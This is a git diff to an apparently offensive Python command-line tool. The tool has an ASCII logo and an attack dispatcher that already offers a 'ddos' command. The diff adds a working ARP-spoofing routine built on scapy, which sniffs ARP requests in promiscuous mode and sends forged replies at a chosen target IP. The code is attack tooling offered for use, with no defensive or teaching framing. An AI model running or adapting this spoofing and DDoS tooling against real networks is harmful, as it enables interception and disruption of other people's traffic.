@@ -1,5 +1,7 @@
 import re
 import socket
+from scapy.all import *
+from scapy.layers.l2 import ARP
 
 LOGO = r"""
   /$$$$$$   /$$$$$$  /$$   /$$ /$$   /$$ /$$$$$$$$ /$$$$$$$$ /$$$$$$$              /$$$$$$ /$$$$$$$  /$$$$$$$   /$$$$$$ 
@@ -46,7 +48,7 @@ def handle_attack(args: list[str]):
                 return
             commit_ddos(args[1])
         case "arp":
-            raise NotImplementedError()
+            commit_arp_spoofing(args[1])
         case _:
             print('Attack not supported! Use "help" to learn more')
 
@@ -62,6 +64,21 @@ def commit_ddos(target: str):
             print("Invalid target! Specify a valid IP address or a domain")
 
     # Attack target
+
+def commit_arp_spoofing(target: str):
+    def packet_handler(packet):
+        arp = packet[ARP]
+        if arp.op != 1 or arp.psrc != target: # Insuring that the packet is relevant
+            return
+        send(ARP(op=2,
+                 psrc=get_if_addr(conf.iface),  # Source IP address (pretending to be)
+                 hwsrc='00:00:00:00:00',  # Source MAC address (your fake MAC)
+                 pdst=target,  # Target IP address (who receives the response)
+                 hwdst=arp.hwsrc  # Target MAC address (destination's MAC)
+                 ))
+
+    print('Committing ARP spoofing, press CTRL+C at any moment to stop.')
+    sniff(prn=packet_handler, promisc=True, store=False, filter='arp')
 
 
 # Returns whether to continue or not
@@ -94,6 +111,7 @@ def main():
         print()  # Newline for bye message
 
     print("\nBye bye!")
+
 
 if __name__ == '__main__':
     main()
